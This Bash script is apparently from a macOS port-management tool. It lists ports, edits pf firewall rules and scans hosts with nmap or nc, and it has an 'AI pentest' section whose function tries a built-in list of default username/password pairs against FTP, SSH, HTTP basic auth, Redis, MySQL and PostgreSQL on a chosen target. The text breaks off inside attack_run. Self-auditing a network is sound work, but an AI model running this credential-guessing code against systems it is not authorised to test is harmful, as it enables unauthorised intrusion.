list_ports() {
  local B=$'\033[1;34m' C=$'\033[0;36m' D=$'\033[2m' R=$'\033[0m' W=$'\033[1;37m'

  printf "\n${B}  %-7s  %-16s  %-24s  %s${R}\n" "PORT" "PID(S)" "ADDRESS" "PROCESS"
  printf "  ${D}───────  ────────────────  ────────────────────────  ──────────────────────${R}\n"

  local count=0
  while IFS=$'\t' read -r _s port pidstr host cmd; do
    local fullname
    local firstpid="${pidstr%%[^0-9]*}"
    fullname=$(ps -p "$firstpid" -o args= 2>/dev/null | awk 'NR==1{print $1}' | sed 's|.*/||' || true)
    [ -z "$fullname" ] && fullname="$cmd"
    printf "  ${C}%-7s${R}  ${D}%-16s${R}  ${D}%-24s${R}  ${W}%s${R}\n" "$port" "$pidstr" "$host" "$fullname"
    (( count++ )) || true
  done < <(sudo lsof -iTCP -iUDP -sTCP:LISTEN -P -n 2>/dev/null | awk 'NR>1 {
    addr=$9; cmd=$1; pid=$2
    n=split(addr,a,":"); port=a[n]+0
    host=""; for(i=1;i<n;i++) host=(i==1)?a[i]:host":"a[i]
    if(host=="") host="*"
    gkey=host SUBSEP port SUBSEP cmd
    pkey=gkey SUBSEP pid
    if(!(pkey in pseen)) {
      pseen[pkey]=1
      if(!(gkey in gseen)) {
        gseen[gkey]=1
        ord[++nk]=gkey; ph[gkey]=host; pp[gkey]=port; pc[gkey]=cmd
        plist[gkey]=pid
      } else {
        plist[gkey]=plist[gkey]","pid
      }
    }
  }
  END {
    for(i=1;i<=nk;i++) {
      k=ord[i]
      n=split(plist[k],ps,",")
      pidstr=(n<=3)?plist[k]:ps[1]" (+"(n-1)" more)"
      printf "%07d\t%d\t%s\t%s\t%s\n", pp[k], pp[k], pidstr, ph[k], pc[k]
    }
  }' | sort -n)

  if [ "$count" -eq 0 ]; then
    printf "\n  ${D}No listening ports found.${R}\n\n"; return
  fi
  printf "\n  ${D}%d service(s) listening${R}\n\n" "$count"
}

open_port() {
  local PORT=$1
  echo "Opening port $PORT to external connections..."
  if [ ! -f "$ANCHOR_FILE" ]; then sudo touch "$ANCHOR_FILE"; fi
  if sudo grep -q "port $PORT$" "$ANCHOR_FILE" 2>/dev/null; then
    echo "Port $PORT is already open."
    exit 0
  fi
  printf "pass in proto tcp from any to any port %s\npass in proto udp from any to any port %s\n" "$PORT" "$PORT" \
    | sudo tee -a "$ANCHOR_FILE" > /dev/null
  if ! sudo grep -q 'anchor "killport"' /etc/pf.conf 2>/dev/null; then
    printf '\nanchor "killport"\nload anchor "killport" from "%s"\n' "$ANCHOR_FILE" \
      | sudo tee -a /etc/pf.conf > /dev/null
  fi
  sudo pfctl -f /etc/pf.conf 2>/dev/null
  sudo pfctl -e 2>/dev/null || true
  echo "Port $PORT is now open (TCP + UDP)."
}

close_port() {
  local PORT=$1
  echo "Closing port $PORT from external connections..."
  if [ ! -f "$ANCHOR_FILE" ] || ! sudo grep -q "port $PORT$" "$ANCHOR_FILE" 2>/dev/null; then
    echo "Port $PORT is not managed by killport."
    exit 0
  fi
  sudo sed -i '' "/port ${PORT}$/d" "$ANCHOR_FILE"
  sudo pfctl -f /etc/pf.conf 2>/dev/null
  echo "Port $PORT is now closed."
}

status_port() {
  local PORT=$1
  echo "Port $PORT status:"
  echo ""

  # Firewall rule
  if [ -f "$ANCHOR_FILE" ] && sudo grep -q "port $PORT$" "$ANCHOR_FILE" 2>/dev/null; then
    echo "  Firewall:  OPEN  (killport rule allows external access)"
  else
    echo "  Firewall:  CLOSED  (no killport rule — external access blocked)"
  fi

  # Actively listening
  local PIDS PIDS_FLAT
  PIDS=$(sudo lsof -ti :"$PORT" 2>/dev/null || true)
  PIDS_FLAT=$(echo "$PIDS" | tr '\n' ',' | sed 's/,$//')
  if [ -n "$PIDS" ]; then
    local NAME
    NAME=$(echo "$PIDS" | head -1 | xargs -I{} ps -p {} -o comm= 2>/dev/null | head -1 || true)
    echo "  Listening: YES  (PID: $PIDS_FLAT — $NAME)"
  else
    echo "  Listening: NO  (nothing is running on this port)"
  fi
}

open_ports() {
  [ -n "${1:-}" ] && { opencheck_ports "$1"; return; }
  local C=$'\033[0;36m'
  local G=$'\033[0;32m'
  local Y=$'\033[0;33m'
  local D=$'\033[2m'
  local B=$'\033[1m'
  local R=$'\033[0m'

  printf "\n${B}${C}  Firewall-Open Ports${R}  ${D}(external access via killport)${R}\n"
  printf "${C}  ────────────────────────────────────────────${R}\n\n"

  if [ ! -f "$ANCHOR_FILE" ] || [ ! -s "$ANCHOR_FILE" ]; then
    printf "  ${D}No ports are currently open to external access.${R}\n"
    printf "  ${D}Run: killport open <port>${R}\n\n"
    return
  fi

  local count=0 listening_count=0
  while read -r port; do
    local PIDS NAME
    PIDS=$(sudo lsof -ti :"$port" 2>/dev/null || true)
    if [ -n "$PIDS" ]; then
      NAME=$(echo "$PIDS" | xargs -I{} ps -p {} -o comm= 2>/dev/null | head -1 || true)
      printf "  ${G}●${R}  ${B}%-8s${R}  ${G}listening${R}   ${D}%s${R}\n" "$port" "$NAME"
      (( listening_count++ )) || true
    else
      printf "  ${Y}○${R}  ${B}%-8s${R}  ${D}not listening${R}\n" "$port"
    fi
    (( count++ )) || true
  done < <(grep -oE 'port [0-9]+' "$ANCHOR_FILE" | awk '{print $2}' | sort -un)

  printf "\n${C}  ────────────────────────────────────────────${R}\n"
  printf "  ${D}%d port(s) open  ·  %d listening${R}\n\n" "$count" "$listening_count"
}

closed_ports() {
  local C=$'\033[0;36m'
  local Y=$'\033[0;33m'
  local D=$'\033[2m'
  local B=$'\033[1m'
  local R=$'\033[0m'

  printf "\n${B}${C}  Locally-Listening Ports${R}  ${D}(no external access)${R}\n"
  printf "${C}  ────────────────────────────────────────────${R}\n\n"

  local open_list=""
  if [ -f "$ANCHOR_FILE" ] && [ -s "$ANCHOR_FILE" ]; then
    open_list=$(grep -oE 'port [0-9]+' "$ANCHOR_FILE" | awk '{print $2}' | sort -un | tr '\n' ' ')
  fi

  local count=0
  while read -r port; do
    if ! echo " $open_list " | grep -q " $port "; then
      local NAME
      NAME=$(sudo lsof -ti :"$port" 2>/dev/null | xargs -I{} ps -p {} -o comm= 2>/dev/null | head -1 || true)
      printf "  ${Y}◆${R}  ${B}%-8s${R}  ${D}local only${R}   ${D}%s${R}\n" "$port" "$NAME"
      (( count++ )) || true
    fi
  done < <(sudo lsof -iTCP -sTCP:LISTEN -P -n 2>/dev/null | awk 'NR>1 {print $9}' | grep -oE '[0-9]+$' | sort -un)

  if [ "$count" -eq 0 ]; then
    printf "  ${D}No locally-only listening ports found.${R}\n\n"
    return
  fi

  printf "\n${C}  ────────────────────────────────────────────${R}\n"
  printf "  ${D}%d port(s) listening locally  ·  no external access${R}\n\n" "$count"
}

ports_inspect() {
  local C=$'\033[0;36m'
  local G=$'\033[0;32m'
  local Y=$'\033[0;33m'
  local D=$'\033[2m'
  local B=$'\033[1m'
  local R=$'\033[0m'

  printf "\n${B}${C}  Port Inspector${R}  ${D}(local view — what this machine sees)${R}\n"
  printf "${C}  ────────────────────────────────────────────${R}\n\n"

  # Firewall status
  local fw_status fw_enabled=false
  fw_status=$(pfctl -s info 2>/dev/null | awk '/^Status:/{print $2}' || true)
  if [ "$fw_status" = "Enabled" ]; then
    fw_enabled=true
    printf "  Firewall  ${G}${B}ENABLED${R}   ${D}pfctl is active${R}\n"
  else
    printf "  Firewall  ${Y}${B}DISABLED${R}  ${D}pfctl is off — all listening ports may be reachable externally${R}\n"
  fi

  # Local LAN IP — prefer the interface used for the default gateway
  local lan_ip _gw_iface
  _gw_iface=$(netstat -rn 2>/dev/null | awk '/^default/{print $NF; exit}')
  if [ -n "$_gw_iface" ]; then
    lan_ip=$(ifconfig "$_gw_iface" 2>/dev/null | awk '/inet / && $2 != "127.0.0.1"{print $2; exit}')
  fi
  [ -z "$lan_ip" ] && lan_ip=$(ifconfig -l 2>/dev/null | tr ' ' '\n' | while read -r iface; do
    ifconfig "$iface" 2>/dev/null | awk '/inet / && $2 != "127.0.0.1"{print $2; exit}'
  done | head -1)
  [ -n "$lan_ip" ] && printf "  LAN IP    ${B}%s${R}\n" "$lan_ip"

  printf "\n  ${B}%-8s  %-14s  %-10s  %s${R}\n" "PORT" "PROCESS" "ACCESS" ""
  printf "  ${D}%-8s  %-14s  %-10s${R}\n" "────────" "──────────────" "──────────"

  # Build killport open list
  local open_list=""
  if [ -f "$ANCHOR_FILE" ] && [ -s "$ANCHOR_FILE" ]; then
    open_list=$(grep -oE 'port [0-9]+' "$ANCHOR_FILE" | awk '{print $2}' | sort -un | tr '\n' ' ')
  fi

  local total=0 open_count=0
  while read -r port; do
    local NAME raw_name
    raw_name=$(sudo lsof -ti :"$port" 2>/dev/null | xargs -I{} ps -p {} -o comm= 2>/dev/null | head -1 || true)
    NAME="${raw_name##*/}"
    if [ ${#NAME} -gt 14 ]; then NAME="${NAME:0:13}…"; fi

    if ! $fw_enabled; then
      printf "  ${Y}◆${R}  ${B}%-8s${R}  %-14s  ${Y}likely open${R}  ${D}(firewall off)${R}\n" "$port" "$NAME"
      (( open_count++ )) || true
    elif echo " $open_list " | grep -q " $port "; then
      printf "  ${G}●${R}  ${B}%-8s${R}  %-14s  ${G}open${R}         ${D}(killport rule)${R}\n" "$port" "$NAME"
      (( open_count++ )) || true
    else
      printf "  ${D}○  %-8s  %-14s  blocked${R}\n" "$port" "$NAME"
    fi
    (( total++ )) || true
  done < <(sudo lsof -iTCP -sTCP:LISTEN -P -n 2>/dev/null | awk 'NR>1 {print $9}' | grep -oE '[0-9]+$' | sort -un)

  printf "\n${C}  ────────────────────────────────────────────${R}\n"
  printf "  ${D}%d port(s) listening  ·  %d open to external access${R}\n" "$total" "$open_count"
  printf "\n  ${D}This is only what the local machine reports. To truly verify${R}\n"
  printf "  ${D}external reachability, run from another machine:${R}\n"
  if [ -n "$lan_ip" ]; then
    printf "  ${B}killport openports %s${R}\n\n" "$lan_ip"
  else
    printf "  ${B}killport openports <this-machine-ip>${R}\n\n"
  fi
}

opencheck_ports() {
  local TARGET=$1
  local C=$'\033[0;36m'
  local G=$'\033[0;32m'
  local D=$'\033[2m'
  local B=$'\033[1m'
  local R=$'\033[0m'

  # Common ports to probe
  local PORTS=(21 22 23 25 53 80 110 143 443 465 587 993 995 \
               3000 3001 3306 4000 4200 5000 5173 5432 \
               6379 8000 8080 8443 8888 9000 9090 9200 27017)

  printf "\n${B}${C}  External Port Check${R}  ${D}→ %s${R}\n" "$TARGET"
  printf "${C}  ────────────────────────────────────────────${R}\n\n"

  if command -v nmap &>/dev/null; then
    printf "  ${D}Scanning with nmap...${R}\n\n"
    local port_csv
    port_csv=$(IFS=,; echo "${PORTS[*]}")
    local found=0
    while IFS= read -r line; do
      local port state service
      port=$(echo "$line" | awk '{print $1}' | cut -d/ -f1)
      state=$(echo "$line" | awk '{print $2}')
      service=$(echo "$line" | awk '{print $3}')
      [ "$state" != "open" ] && continue
      printf "  ${G}●${R}  ${B}%-8s${R}  ${G}open${R}   ${D}%s${R}\n" "$port" "$service"
      (( found++ )) || true
    done < <(nmap -p "$port_csv" --open -T4 "$TARGET" 2>/dev/null | grep "^[0-9]")
    if [ "$found" -eq 0 ]; then
      printf "  ${D}No open ports found on scanned list.${R}\n"
    fi
    printf "\n${C}  ────────────────────────────────────────────${R}\n"
    printf "  ${D}%d open port(s) found  ·  scanned %d common ports via nmap${R}\n\n" "$found" "${#PORTS[@]}"
  else
    printf "  ${D}nmap not found — probing %d common ports with nc (parallel)...${R}\n\n" "${#PORTS[@]}"
    local tmpfile
    tmpfile=$(mktemp)
    for port in "${PORTS[@]}"; do
      ( nc -z -w1 "$TARGET" "$port" 2>/dev/null && printf "%05d\n" "$port" >> "$tmpfile" ) &
    done
    wait
    local found=0
    if [ -s "$tmpfile" ]; then
      while IFS= read -r padded; do
        local port=$(( 10#$padded ))
        printf "  ${G}●${R}  ${B}%-8s${R}  ${G}open${R}\n" "$port"
        (( found++ )) || true
      done < <(sort "$tmpfile")
    fi
    rm -f "$tmpfile"
    if [ "$found" -eq 0 ]; then
      printf "  ${D}No open ports found on scanned list.${R}\n"
    fi
    printf "\n${C}  ────────────────────────────────────────────${R}\n"
    printf "  ${D}%d open port(s) found  ·  scanned %d common ports via nc${R}\n" "$found" "${#PORTS[@]}"
    printf "  ${D}Install nmap for broader coverage: brew install nmap${R}\n\n"
  fi
}

show_ip() {
  echo "Network Interfaces"
  echo "────────────────────────────────────"
  local iface mac ipv4 ipv6 status info
  local primary_iface primary_mac primary_ipv4 primary_ipv6 primary_status
  primary_iface="" primary_mac="" primary_ipv4="" primary_ipv6="" primary_status=""

  # Determine the interface used for the default gateway route
  local gw_iface
  gw_iface=$(netstat -rn 2>/dev/null | awk '/^default/{print $NF; exit}')

  for iface in $(ifconfig -l 2>/dev/null); do
    info=$(ifconfig "$iface" 2>/dev/null)
    mac="";  ipv4="";  ipv6="";  status=""
    mac=$(printf '%s\n'    "$info" | awk '/ether /{print $2; exit}')
    ipv4=$(printf '%s\n'   "$info" | awk '/inet /{print $2; exit}')
    ipv6=$(printf '%s\n'   "$info" | awk '/inet6 / && $2 !~ /%/{print $2; exit}')
    status=$(printf '%s\n' "$info" | awk '/status:/{print $2; exit}')
    [ -z "$mac" ] && [ -z "$ipv4" ] && continue

    # Reserve the gateway interface as primary; fall back to first active+IPv4
    if [ "$iface" = "$gw_iface" ]; then
      primary_iface="$iface"; primary_mac="$mac"; primary_ipv4="$ipv4"
      primary_ipv6="$ipv6";   primary_status="$status"
      continue
    fi
    if [ -z "$primary_iface" ] && [ "$status" = "active" ] && [ -n "$ipv4" ] && [ "$ipv4" != "127.0.0.1" ]; then
      primary_iface="$iface"; primary_mac="$mac"; primary_ipv4="$ipv4"
      primary_ipv6="$ipv6";   primary_status="$status"
      continue
    fi

    echo ""
    echo "  Interface: $iface"
    [ -n "$mac" ]    && echo "  MAC:       $mac"
    [ -n "$status" ] && echo "  Status:    $status"
    [ -n "$ipv4" ]   && echo "  IPv4:      $ipv4"
    [ -n "$ipv6" ]   && echo "  IPv6:      $ipv6"
  done

  # Print primary (LAN) interface last, inside a box
  if [ -n "$primary_iface" ]; then
    local B=$'\033[1;36m' R=$'\033[0m'
    echo ""
    printf "${B}┌─────────────────────────────────────────┐${R}\n"
    printf "${B}│  %-41s│${R}\n" "Interface: $primary_iface"
    [ -n "$primary_mac" ]    && printf "${B}│  %-41s│${R}\n" "MAC:       $primary_mac"
    [ -n "$primary_status" ] && printf "${B}│  %-41s│${R}\n" "Status:    $primary_status"
    [ -n "$primary_ipv4" ]   && printf "${B}│  %-41s│${R}\n" "IPv4:      $primary_ipv4"
    [ -n "$primary_ipv6" ]   && printf "${B}│  %-41s│${R}\n" "IPv6:      $primary_ipv6"
    printf "${B}└─────────────────────────────────────────┘${R}\n"
  fi

  echo ""
  echo "Default Gateway"
  echo "────────────────────────────────────"
  netstat -rn 2>/dev/null | awk '/^default/{print "  " $2; exit}'

  echo ""
  echo "DNS Servers"
  echo "────────────────────────────────────"
  scutil --dns 2>/dev/null | awk '/nameserver/{print "  " $3}' | sort -u

  echo ""
  echo "Firewall-managed ports (killport)"
  echo "────────────────────────────────────"
  if [ -f "$ANCHOR_FILE" ] && [ -s "$ANCHOR_FILE" ]; then
    grep -oE 'port [0-9]+' "$ANCHOR_FILE" | awk '{print "  " $2}' | sort -un
  else
    echo "  None"
  fi
}

# ── Attack: AI-powered LAN penetration testing ──────────
ATTACK_DIR="${HOME}/.config/killport"
ATTACK_CONF="${ATTACK_DIR}/attack.conf"
ATTACK_LOG="${ATTACK_DIR}/attack.log"

attack_load_conf() {
  ATTACK_OLLAMA="localhost:11434"
  ATTACK_MODEL=""
  if [ -f "$ATTACK_CONF" ]; then
    while IFS='=' read -r k v; do
      k=$(printf '%s' "$k" | tr -d ' '); v=$(printf '%s' "$v" | tr -d $'\r')
      case "$k" in
        OLLAMA_HOST) ATTACK_OLLAMA="$v" ;;
        MODEL)       ATTACK_MODEL="$v"  ;;
      esac
    done < "$ATTACK_CONF"
  fi
}

attack_save_conf() {
  mkdir -p "$ATTACK_DIR"
  printf 'OLLAMA_HOST=%s\nMODEL=%s\n' "$ATTACK_OLLAMA" "$ATTACK_MODEL" > "$ATTACK_CONF"
}

attack_config() {
  local C=$'\033[0;36m' G=$'\033[0;32m' Y=$'\033[0;33m' RE=$'\033[0;31m'
  local D=$'\033[2m' B=$'\033[1m' R=$'\033[0m'
  stty sane 2>/dev/null || true   # reset TTY in case a previous run left it broken
  attack_load_conf
  printf "\n${B}${C}  Attack Config${R}\n"
  printf "${C}  ────────────────────────────────────────────${R}\n\n"
  printf "  Config: ${D}%s${R}\n\n" "$ATTACK_CONF"

  # ── Ollama host ──────────────────────────────────────
  printf "  ${B}Ollama Host${R}\n"
  printf "  ${D}Ollama is the AI engine that runs your models locally or on another machine.${R}\n"
  printf "  ${D}Enter the host and port where Ollama is running:${R}\n\n"
  printf "    ${D}• This machine:    ${B}localhost:11434${R}  ${D}or${R}  ${B}127.0.0.1:11434${R}\n"
  printf "    ${D}• Another LAN box: ${B}192.168.x.x:11434${R}  ${D}(the IP of that machine)${R}\n"
  printf "    ${D}• Remote server:   ${B}45.76.x.x:11434${R}   ${D}(must have port 11434 open)${R}\n\n"
  printf "  ${D}Default port is always 11434. Press Enter to keep current value.${R}\n\n"
  printf "  Current: ${B}%s${R}\n  → " "$ATTACK_OLLAMA"
  read -r _h; _h="${_h%$'\r'}"; [ -n "$_h" ] && ATTACK_OLLAMA="${_h%$'\r'}"

  # ── Connect and list models ──────────────────────────
  printf "\n  ${D}Connecting to Ollama at %s...${R}\n" "$ATTACK_OLLAMA"
  local tags_json
  tags_json=$(curl -sf --max-time 5 "http://${ATTACK_OLLAMA}/api/tags" 2>/dev/null || true)
  if [ -z "$tags_json" ]; then
    printf "  ${RE}Cannot reach Ollama at http://%s${R}\n" "$ATTACK_OLLAMA"
    printf "  ${D}Start it with: ollama serve${R}\n\n"
    printf "  Save host anyway? [y/N] → "
    read -r _ans
    if [[ "$_ans" =~ ^[Yy]$ ]]; then
      attack_save_conf
      printf "  ${Y}Saved (no model selected — will auto-detect when reachable).${R}\n\n"
    else
      printf "  ${D}Aborted. No changes saved.${R}\n\n"
    fi
    return
  fi

  # Parse model names with python3
  local models_json model_names=()
  if command -v python3 &>/dev/null; then
    while IFS= read -r name; do
      [ -n "$name" ] && model_names+=("$name")
    done < <(printf '%s' "$tags_json" | python3 -c \
      "import json,sys
d=json.load(sys.stdin)
for m in d.get('models',[]):
    print(m['name'])" 2>/dev/null || true)
  fi

  if [ "${#model_names[@]}" -eq 0 ]; then
    printf "  ${Y}Connected but no models are loaded.${R}\n"
    printf "  ${D}Pull one with: ollama pull llama3.2${R}\n\n"
    attack_save_conf
    printf "  ${G}Host saved.${R}\n\n"
    return
  fi

  printf "  ${G}Connected.${R}  ${D}%d model(s) available:${R}\n\n" "${#model_names[@]}"

  local i=1
  for name in "${model_names[@]}"; do
    local marker="  "
    [ "$name" = "$ATTACK_MODEL" ] && marker="${G}▶${R} "
    printf "  %s${B}%2d${R}  %s\n" "$marker" "$i" "$name"
    (( i++ )) || true
  done
  printf "\n  ${D}0 = auto-detect (always use first loaded model)${R}\n"

  # Find current selection index for display
  local current_display="auto"
  for (( j=0; j<${#model_names[@]}; j++ )); do
    [ "${model_names[$j]}" = "$ATTACK_MODEL" ] && current_display="$(( j+1 ))"
  done

  printf "\n  Select model  ${D}[current: %s]${R}\n  → " "$current_display"
  read -r _sel; _sel="${_sel%$'\r'}"

  if [ -z "$_sel" ]; then
    : # keep existing
  elif [ "$_sel" = "0" ]; then
    ATTACK_MODEL=""
  elif [[ "$_sel" =~ ^[0-9]+$ ]] && [ "$_sel" -ge 1 ] && [ "$_sel" -le "${#model_names[@]}" ]; then
    ATTACK_MODEL="${model_names[$(( _sel - 1 ))]}"
  else
    printf "  ${Y}Invalid selection — keeping current.${R}\n"
  fi

  attack_save_conf
  local saved_display="${ATTACK_MODEL:-auto-detect}"
  printf "\n  ${G}Saved.${R}  Host: ${B}%s${R}  ·  Model: ${B}%s${R}\n\n" "$ATTACK_OLLAMA" "$saved_display"
}

attack_log_view() {
  local C=$'\033[0;36m' D=$'\033[2m' B=$'\033[1m' R=$'\033[0m'
  if [ ! -s "$ATTACK_LOG" ]; then
    printf "\n  ${D}No attack log yet at %s${R}\n\n" "$ATTACK_LOG"; return
  fi
  printf "\n${B}${C}  Attack Log${R}  ${D}%s${R}\n" "$ATTACK_LOG"
  printf "${C}  ────────────────────────────────────────────${R}\n\n"
  if command -v less &>/dev/null; then less -R "$ATTACK_LOG"; else cat "$ATTACK_LOG"; fi
}

attack_log_write() {
  mkdir -p "$ATTACK_DIR"
  local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
  {
    printf '\n════════════════════════════════════════════════════════════\n'
    printf 'Time:   %s  |  Target: %s\n' "$ts" "$1"
    printf 'Model:  %s  |  Ports:  %s\n' "$2" "$3"
    printf '════════════════════════════════════════════════════════════\n'
    printf '%s\n' "$4"
  } >> "$ATTACK_LOG"
}

attack_probe_creds() {
  local target="$1" service_lines="$2"
  local RE=$'\033[0;31m' Y=$'\033[0;33m' G=$'\033[0;32m' D=$'\033[2m' B=$'\033[1m' R=$'\033[0m'

  local CREDS=(
    "admin:admin"       "admin:password"    "admin:1234"     "admin:12345"  "admin:"
    "root:root"         "root:password"     "root:toor"      "root:1234"    "root:"
    "user:user"         "user:password"     "test:test"      "guest:guest"  "guest:"
    "pi:raspberry"      "ubuntu:ubuntu"     "admin:admin123" "administrator:administrator"
  )
  local findings=""

  _has_port() { printf '%s' "$service_lines" | grep -q "^port ${1}/tcp"; }

  # ── FTP (21) ──────────────────────────────────────────
  if _has_port 21; then
    printf "  ${D}Testing FTP (port 21)...${R}\n" >&2
    local ftp_hit=""
    for cred in "${CREDS[@]}"; do
      local u="${cred%%:*}" p="${cred#*:}"
      local res; res=$(curl -s --max-time 4 "ftp://${u}:${p}@${target}/" 2>&1 | head -2 || true)
      if ! printf '%s' "$res" | grep -qiE "530|login.*denied|not logged|curl: \(67\)|curl: \(21\)"; then
        printf "  ${RE}●${R}  FTP 21     ${B}%-28s${R}  ${RE}ACCESS GRANTED${R}\n" "$cred" >&2
        findings+="FTP port 21: login succeeded with username='${u}' password='${p}'"$'\n'
        ftp_hit=1; break
      fi
    done
    [ -z "$ftp_hit" ] && printf "  ${D}○  FTP 21     no common credentials accepted${R}\n" >&2
  fi

  # ── SSH (22) ──────────────────────────────────────────
  if _has_port 22; then
    if command -v sshpass &>/dev/null; then
      printf "  ${D}Testing SSH (port 22)...${R}\n" >&2
      local ssh_hit=""
      for cred in "${CREDS[@]}"; do
        local u="${cred%%:*}" p="${cred#*:}"
        if sshpass -p "$p" ssh \
            -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            -o BatchMode=no -o LogLevel=ERROR \
            "${u}@${target}" exit 2>/dev/null; then
          printf "  ${RE}●${R}  SSH 22     ${B}%-28s${R}  ${RE}ACCESS GRANTED${R}\n" "$cred" >&2
          findings+="SSH port 22: login succeeded with username='${u}' password='${p}'"$'\n'
          ssh_hit=1; break
        fi
      done
      [ -z "$ssh_hit" ] && printf "  ${D}○  SSH 22     no common credentials accepted${R}\n" >&2
    else
      printf "  ${D}○  SSH 22     skipped (install sshpass to enable)${R}\n" >&2
      findings+="SSH port 22: credential probe skipped — install sshpass to test this"$'\n'
    fi
  fi

  # ── Telnet (23) ───────────────────────────────────────
  if _has_port 23; then
    printf "  ${RE}●${R}  Telnet 23  ${RE}PORT IS OPEN — unencrypted, all traffic visible${R}\n" >&2
    findings+="Telnet port 23: open — this protocol sends everything including passwords in plain text"$'\n'
  fi

  # ── HTTP basic auth ───────────────────────────────────
  for port in 80 443 8080 8000 8081 8443 3000 4000 4848 7001 9090; do
    _has_port "$port" || continue
    local scheme="http"; [[ "$port" =~ ^(443|8443)$ ]] && scheme="https"
    printf "  ${D}Testing HTTP basic auth (port %s)...${R}\n" "$port" >&2
    local http_hit=""
    for cred in "${CREDS[@]}"; do
      local u="${cred%%:*}" p="${cred#*:}"
      local code; code=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" \
        -u "${u}:${p}" "${scheme}://${target}:${port}/" 2>/dev/null || true)
      if [[ "$code" =~ ^(200|301|302|303)$ ]]; then
        printf "  ${RE}●${R}  HTTP %-5s${B}%-28s${R}  ${RE}ACCESS GRANTED (HTTP %s)${R}\n" "$port" "$cred" "$code" >&2
        findings+="HTTP port ${port}: login succeeded with username='${u}' password='${p}'"$'\n'
        http_hit=1; break
      fi
    done
    [ -z "$http_hit" ] && printf "  ${D}○  HTTP %-4s no common credentials accepted${R}\n" "$port" >&2
  done

  # ── Redis (6379) ──────────────────────────────────────
  if _has_port 6379; then
    printf "  ${D}Testing Redis (port 6379)...${R}\n" >&2
    local pong; pong=$(printf "PING\r\nQUIT\r\n" | nc -w3 "$target" 6379 2>/dev/null | tr -d '\r' | head -1 || true)
    if [[ "$pong" = "+PONG"* ]]; then
      printf "  ${RE}●${R}  Redis 6379 ${RE}NO PASSWORD — open to anyone on the network${R}\n" >&2
      findings+="Redis port 6379: no password set — anyone can read and delete all stored data"$'\n'
    else
      local redis_hit=""
      for cred in "${CREDS[@]}"; do
        local p="${cred#*:}"; [ -z "$p" ] && continue
        local res; res=$(printf "AUTH %s\r\nQUIT\r\n" "$p" | nc -w3 "$target" 6379 2>/dev/null | tr -d '\r' | head -1 || true)
        if [[ "$res" = "+OK"* ]]; then
          printf "  ${RE}●${R}  Redis 6379 password '${B}%s${R}'  ${RE}WEAK PASSWORD ACCEPTED${R}\n" "$p" >&2
          findings+="Redis port 6379: weak password '${p}' accepted"$'\n'
          redis_hit=1; break
        fi
      done
      [ -z "$redis_hit" ] && printf "  ${D}○  Redis 6379 password protected, common passwords rejected${R}\n" >&2
    fi
  fi

  # ── MongoDB (27017) ───────────────────────────────────
  if _has_port 27017; then
    printf "  ${D}Testing MongoDB (port 27017)...${R}\n" >&2
    local mongo_res; mongo_res=$(printf '\x3a\x00\x00\x00' | nc -w3 "$target" 27017 2>/dev/null | tr -cd '[:print:]' | head -c 30 || true)
    if [ -n "$mongo_res" ]; then
      printf "  ${RE}●${R}  Mongo 27017 ${RE}RESPONDS WITHOUT AUTH — database may be fully exposed${R}\n" >&2
      findings+="MongoDB port 27017: responds without authentication — database contents may be accessible"$'\n'
    else
      printf "  ${D}○  Mongo 27017 authentication appears enforced${R}\n" >&2
    fi
  fi

  # ── MySQL (3306) ──────────────────────────────────────
  if _has_port 3306; then
    if command -v mysql &>/dev/null; then
      printf "  ${D}Testing MySQL (port 3306)...${R}\n" >&2
      local mysql_hit=""
      for cred in "${CREDS[@]}"; do
        local u="${cred%%:*}" p="${cred#*:}"
        local res; res=$(mysql -h "$target" -P 3306 -u "$u" -p"$p" --connect-timeout=3 \
          -e "SELECT 1;" 2>&1 | head -1 || true)
        if printf '%s' "$res" | grep -qE "^1$|\| 1 \|"; then
          printf "  ${RE}●${R}  MySQL 3306  ${B}%-28s${R}  ${RE}ACCESS GRANTED${R}\n" "$cred" >&2
          findings+="MySQL port 3306: login succeeded with username='${u}' password='${p}'"$'\n'
          mysql_hit=1; break
        fi
      done
      [ -z "$mysql_hit" ] && printf "  ${D}○  MySQL 3306  no common credentials accepted${R}\n" >&2
    else
      printf "  ${D}○  MySQL 3306  skipped (mysql client not installed)${R}\n" >&2
      findings+="MySQL port 3306: credential probe skipped — mysql client not installed"$'\n'
    fi
  fi

  # ── PostgreSQL (5432) ─────────────────────────────────
  if _has_port 5432; then
    if command -v psql &>/dev/null; then
      printf "  ${D}Testing PostgreSQL (port 5432)...${R}\n" >&2
      local pg_hit=""
      for cred in "${CREDS[@]}"; do
        local u="${cred%%:*}" p="${cred#*:}"
        local res; res=$(PGPASSWORD="$p" psql -h "$target" -p 5432 -U "$u" -c "\q" 2>&1 | head -1 || true)
        if ! printf '%s' "$res" | grep -qiE "failed|denied|refused|error|fatal"; then
          printf "  ${RE}●${R}  PgSQL 5432  ${B}%-28s${R}  ${RE}ACCESS GRANTED${R}\n" "$cred" >&2
          findings+="PostgreSQL port 5432: login succeeded with username='${u}' password='${p}'"$'\n'
          pg_hit=1; break
        fi
      done
      [ -z "$pg_hit" ] && printf "  ${D}○  PgSQL 5432  no common credentials accepted${R}\n" >&2
    else
      printf "  ${D}○  PgSQL 5432  skipped (psql not installed)${R}\n" >&2
      findings+="PostgreSQL port 5432: credential probe skipped — psql not installed"$'\n'
    fi
  fi
  printf '%s' "$findings"
}

attack_run() {
  local TARGET="$1" FULL_SCAN="${2:-}" SINGLE_PORT=""
  if [[ "$TARGET" =~ ^(.+):([0-9]+)$ ]]; then
    SINGLE_PORT="${BASH_REMATCH[2]}"; TARGET="${BASH_REMATCH[1]}"
  fi

  local C=$'\033[0;36m' G=$'\033[0;32m' Y=$'\033[0;33m' RE=$'\033[0;31m'
  local D=$'\033[2m' B=$'\033[1m' R=$'\033[0m'

  attack_load_conf

  if [ -n "$SINGLE_PORT" ]; then
    printf "\n${B}${C}  AI Pentest${R}  ${D}→ %s : %s${R}\n" "$TARGET" "$SINGLE_PORT"
  else
    printf "\n${B}${C}  AI Pentest${R}  ${D}→ %s  (all common ports)${R}\n" "$TARGET"
  fi
  printf "${C}  ────────────────────────────────────────────${R}\n\n"

  command -v python3 &>/dev/null || { printf "  ${RE}python3 required but not found.${R}\n\n"; return 1; }

  # ── tool check / install ──────────────────────────────
  _brew_install() {
    local _tool="$1" _desc="$2"
    printf "  ${Y}%s not installed${R} — %s\n" "$_tool" "$_desc"
    if command -v brew &>/dev/null; then
      printf "  Install it now with Homebrew? [Y/n] → "
      read -r _ans
